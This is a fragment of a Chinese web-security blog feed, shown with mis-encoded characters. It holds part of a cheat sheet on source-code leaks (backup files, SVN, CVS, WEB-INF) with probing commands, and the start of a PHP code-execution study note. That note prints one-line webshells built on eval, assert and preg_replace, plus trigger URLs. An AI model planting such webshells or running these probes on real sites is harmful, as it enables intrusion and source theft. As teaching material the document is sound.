href="#ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶" class="headerlink" title="ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"></a>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</h2><p>åœ¨ç½‘ç«™çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€éœ€è¦å¯¹ç½‘ç«™ä¸­çš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€å‡çº§ã€‚æ­¤æ—¶å°±éœ€è¦å¯¹ç½‘ç«™æ•´ç«™æˆ–è€…å…¶ä¸­æŸä¸€é¡µé¢è¿›è¡Œå¤‡ä»½ã€‚å½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™webç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p><p><strong>æ¼æ´æˆå› åŠå±å®³:</strong></p><p>è¯¥æ¼æ´çš„æˆå› ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li>æœåŠ¡å™¨ç®¡ç†å‘˜é”™è¯¯åœ°å°†ç½‘ç«™æˆ–è€…ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨webç›®å½•ä¸‹ã€‚</li><li>ç¼–è¾‘å™¨åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è‡ªåŠ¨ä¿å­˜çš„å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¸´æ—¶æ–‡ä»¶å› ä¸ºå„ç§åŸå› æ²¡æœ‰è¢«åˆ é™¤è€Œä¿å­˜åœ¨webç›®å½•ä¸‹ã€‚</li></ol><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h2 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h2><h3 id="fuzzï¼š-3"><a href="#fuzzï¼š-3" class="headerlink" title="fuzzï¼š"></a>fuzzï¼š</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://url/.svn/entries</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨ï¼š-3"><a href="#æ¼æ´åˆ©ç”¨ï¼š-3" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><p>å·¥å…·ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><h2 id="WEB-INF-web-xmlæ³„éœ²"><a href="#WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF/web.xmlæ³„éœ²"></a>WEB-INF/web.xmlæ³„éœ²</h2><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡<code>web.xml</code>æ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><h3 id="æ¼æ´æˆå› ï¼š-3"><a href="#æ¼æ´æˆå› ï¼š-3" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h3><p>é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´<code>web.xml</code>ç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚</p><h3 id="WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š"><a href="#WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š" class="headerlink" title="WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š"></a>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</h3><ul><li><code>/WEB-INF/web.xml</code>ï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</li><li><code>/WEB-INF/classes/</code>ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­</li><li><code>/WEB-INF/lib/</code>ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶</li><li><code>/WEB-INF/src/</code>ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚</li><li><code>/WEB-INF/database.properties</code>ï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</li></ul><h3 id="æ¼æ´åˆ©ç”¨ï¼š-4"><a href="#æ¼æ´åˆ©ç”¨ï¼š-4" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨ç›´æ¥è¯»å–ï¼Œæ¨æ–­<code>class</code>æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥<code>class</code>æ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘<code>class</code>æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ä¸€èˆ¬æƒ…å†µï¼Œ<code>jsp</code>å¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®<code>WEB-INF</code>ç›®å½•çš„</p><h2 id="CVSæ³„æ¼"><a href="#CVSæ³„æ¼" class="headerlink" title="CVSæ³„æ¼"></a>CVSæ³„æ¼</h2><h3 id="fuzz-1"><a href="#fuzz-1" class="headerlink" title="fuzz"></a>fuzz</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root è¿”å›æ ¹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å–å›æºç çš„å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤çš„æ„æ€å°±æ˜¯æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºnameçš„repo cloneåˆ°æœ¬åœ°åä¸ºdirçš„ç›®å½•ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤ï¼Œè½¬åˆ°downloadçš„ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h2 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h2><h3 id="æ¼æ´åˆ©ç”¨ï¼š-5"><a href="#æ¼æ´åˆ©ç”¨ï¼š-5" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼š"></a>æ¼æ´åˆ©ç”¨ï¼š</h3><p>å·¥å…·ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://url/.bzr/</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">æ–‡ä»¶æ³„éœ²</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">å¸¸è§Webæºç æ³„éœ²è§£æ</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;webå¸¸è§æºç æ³„éœ²å¤‡å¿˜å½•&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´</title>
    <link href="http://0clickjacking0.github.io/2019/04/15/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://0clickjacking0.github.io/2019/04/15/phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´/</id>
    <published>2019-04-15T13:17:12.000Z</published>
    <updated>2019-11-27T11:49:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>å­¦ä¹ phpä»£ç æ‰§è¡Œä¸å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ²¡æœ‰æ–°å§¿åŠ¿</p><a id="more"></a><h1 id="å¸¸è§å±é™©å‡½æ•°"><a href="#å¸¸è§å±é™©å‡½æ•°" class="headerlink" title="å¸¸è§å±é™©å‡½æ•°"></a>å¸¸è§å±é™©å‡½æ•°</h1><h2 id="phpä»£ç æ‰§è¡Œç›¸å…³"><a href="#phpä»£ç æ‰§è¡Œç›¸å…³" class="headerlink" title="phpä»£ç æ‰§è¡Œç›¸å…³"></a>phpä»£ç æ‰§è¡Œç›¸å…³</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed <span class="keyword">eval</span>( string $code)</span><br></pre></td></tr></table></figure><p><code>eval()</code>å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§phpä»£ç æ¥è®¡ç®—ï¼Œå¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>å¾—åˆ°phpinfo()é¡µé¢ã€‚</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, string $description] )</span><br></pre></td></tr></table></figure><p>php7ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert( mixed $assertion[, Throwable $exception] )</span><br></pre></td></tr></table></figure><p><strong>assert()</strong> ä¼šæ£€æŸ¥æŒ‡å®šçš„    <code>assertion</code> å¹¶åœ¨ç»“æœä¸º <strong>FALSE</strong> æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ã€‚</p><p>å¦‚æœ <code>assertion</code> æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« <strong>assert()</strong> å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚</p><p>æ™®é€šè°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> assert($_GET[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> assert($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>åå¯ä»¥ä¸ç”¨åˆ†å·ï¼Œå¾—åˆ°phpinfoé¡µé¢ã€‚</p><p>assertå‡½æ•°æ”¯æŒåŠ¨æ€è°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a($_POST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>phpå®˜æ–¹åœ¨php7ä¸­æ›´æ”¹äº†assertå‡½æ•°ã€‚åœ¨php7.0.29ä¹‹åçš„ç‰ˆæœ¬ä¸æ”¯æŒåŠ¨æ€è°ƒç”¨ã€‚</strong></p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = <span class="number">-1</span>[, int &amp;$count]] )</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code>åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„åå‘å¼•ç”¨æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç è¯„ä¼°æ‰§è¡Œ(<code>eval</code>å‡½æ•°æ–¹å¼)ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿()å’Œ NULL å­—ç¬¦åœ¨åå‘å¼•ç”¨æ›¿æ¢æ—¶ä¼šè¢«ç”¨åæ–œçº¿è½¬ä¹‰.</p><h4 id="ç¬¬ä¸€ä¸ªå‚æ•°"><a href="#ç¬¬ä¸€ä¸ªå‚æ•°" class="headerlink" title="ç¬¬ä¸€ä¸ªå‚æ•°"></a>ç¬¬ä¸€ä¸ªå‚æ•°</h4><!--è¿˜æ²¡å†™è¿‡ï¼Œæœ‰ç©ºè¡¥å……--><h4 id="ç¬¬äºŒä¸ªå‚æ•°"><a href="#ç¬¬äºŒä¸ªå‚æ•°" class="headerlink" title="ç¬¬äºŒä¸ªå‚æ•°"></a>ç¬¬äºŒä¸ªå‚æ•°</h4><p>ä¸€å¥è¯æœ¨é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@preg_replace(<span class="string">"/123/e"</span>,$_REQUEST[<span class="string">'cmd'</span>],<span class="string">"1234"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>php 7.0.0  ä¸å†æ”¯æŒ  <em>/e</em>ä¿®é¥°ç¬¦</p><p>æ›´è¯¦ç»†è¯´æ˜è¯·å‚è€ƒæ–‡æ¡£ï¼š<a href="http://php.net/preg_replace" target="_blank" rel="noopener">php-preg_replace</a></p><h4 id="ç¬¬ä¸‰ä¸ªå‚æ•°"><a href="#ç¬¬ä¸‰ä¸ªå‚æ•°" class="headerlink" title="ç¬¬ä¸‰ä¸ªå‚æ•°"></a>ç¬¬ä¸‰ä¸ªå‚æ•°</h4><!--è¿˜æ²¡å†™è¿‡ï¼Œæœ‰ç©ºè¡¥å……--><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string create_function( string $args, string $code)</span><br></pre></td></tr></table></figure><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$fname'</span>,<span class="string">'echo $fname."Zhang"'</span>)</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($fname)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> $fname.<span class="string">"Zhang"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„å†…éƒ¨å®ç°ç”¨åˆ°äº†<code>eval</code>ï¼Œæ‰€ä»¥ä¹Ÿå…·æœ‰ç›¸åŒçš„å®‰å…¨é—®é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</span><br><span class="line">$b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å­˜åœ¨ç¼ºé™·ï¼Œè¯¦è§<a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()ä»£ç æ³¨å…¥</a></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func( callable $callback[, mixed $parameter[, mixed $...]] )</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°<code>callback</code>æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ ä¼ å…¥<code>call_user_func()</code>çš„å‚æ•°ä¸èƒ½ä¸ºå¼•ç”¨ä¼ é€’ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec=phpinfo()</span><br></pre></td></tr></table></figure><p><code>eval()</code>åœ¨è¿™é‡Œæ˜¯ä¸èƒ½ä½œä¸ºå›è°ƒå‡½æ•°ä½¿ç”¨çš„ã€‚</p><p>åœ¨phpä¸­ï¼Œå¯ä»¥é€šè¿‡<code>is_callable</code>æ¥åˆ¤æ–­ä¸€ä¸ªå‡½æ•°æ˜¯å¦ä¸ºå›è°ƒå‡½æ•°ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> is_callable(<span class="string">"eval"</span>) == <span class="keyword">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func_array( callable $callback, <span class="keyword">array</span> $param_arr)</span><br></pre></td></tr></table></figure><p> æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆ<code>callback</code>ï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆ<code>param_arr</code>ï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func_array($_GET[<span class="string">'fun'</span>],$_GET[<span class="string">'exec'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test.php?fun=assert&amp;exec[]=phpinfo()</span><br></pre></td></tr></table></figure><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> array_map( callable $callback, <span class="keyword">array</span> $array1[, <span class="keyword">array</span> $...] )</span><br></pre></td></tr></table></figure><p>è¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º <code>array1</code> æ¯ä¸ªå…ƒç´ åº”ç”¨ <code>callback</code>å‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚<code>callback</code> å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ <strong>array_map()</strong> æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/test1.php?a=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><h2 id="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç›¸å…³"><a href="#ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç›¸å…³" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç›¸å…³"></a>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç›¸å…³</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string system( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><p>commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚return_varï¼Œå¦‚æœæä¾› return_var å‚æ•°ï¼Œ åˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­ã€‚</p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void passthru( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><p>commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚return_varï¼Œå¦‚æœæä¾› return_var å‚æ•°ï¼Œ Unix å‘½ä»¤çš„è¿”å›çŠ¶æ€ä¼šè¢«è®°å½•åˆ°æ­¤å‚æ•°ã€‚</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] )</span><br></pre></td></tr></table></figure><p>exec() æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚ å…¶ä½™å‚æ•°ï¼Œè§<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">æ–‡æ¡£</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ls"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿”å›å€¼æ˜¯å‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚</p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void pcntl_exec ( string $path [, array $args [, array $envs 